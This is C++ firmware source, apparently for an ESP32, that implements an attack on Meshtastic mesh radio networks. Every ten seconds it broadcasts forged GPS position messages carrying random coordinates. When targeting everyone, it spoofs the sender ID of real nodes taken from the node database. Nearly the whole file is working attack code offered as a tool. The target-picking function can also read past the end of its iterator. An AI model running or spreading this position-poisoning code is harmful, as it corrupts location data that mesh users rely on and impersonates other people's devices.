#include "TMAttack.hpp"
#include "esp_log.h"
#include <iterator>

uint32_t TMAttack::getRandomTarget() {
    uint16_t cnt = 0;  // todo handle it in lib better
    uint32_t srcnode = 0;
    do {
        cnt++;
        auto it = meshtasticCompact->nodeinfo_db.begin();
        int rnd = esp_random() % NodeInfoDB::MAX_NODES;
        for (int o = 0; o < rnd; o++) {
            if (it != meshtasticCompact->nodeinfo_db.end()) {
                ++it;
            }
        }
        srcnode = it->node_id;
    } while (cnt < 100 && srcnode == 0);
    return srcnode;
}

void TMAttack::rndPos() {
    // Generate random latitude and longitude within specified bounds
    double latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
    double longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));

    // Create and send the fake position message
    MC_Position pos_msg = {};
    pos_msg.latitude_i = static_cast<int32_t>(latitude * 1e7);
    pos_msg.longitude_i = static_cast<int32_t>(longitude * 1e7);
    pos_msg.altitude = esp_random() % 1000;  // Random altitude
    pos_msg.ground_speed = 0;
    pos_msg.sats_in_view = 0;
    pos_msg.location_source = 1;
    pos_msg.has_latitude_i = true;
    pos_msg.has_longitude_i = true;
    pos_msg.has_altitude = true;
    pos_msg.has_ground_speed = true;
    uint32_t srcnode = target;   // todo randomize based on node db
    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
        srcnode = getRandomTarget();
        if (srcnode == 0) {
            return;  // no valid target found
        }
    }
    meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
}

void TMAttack::loop() {
    if (meshtasticCompact == nullptr) {
        return;  // Radio not set
    }
    if (current_attack == AttackType::NONE) {
        return;  // No attack to perform
    }
    timer++;
    if (timer < 100) {  // every 10 seconds
        return;
    }
    timer = 0;
    if (current_attack == AttackType::POS_POISON) {
        rndPos();
    }
}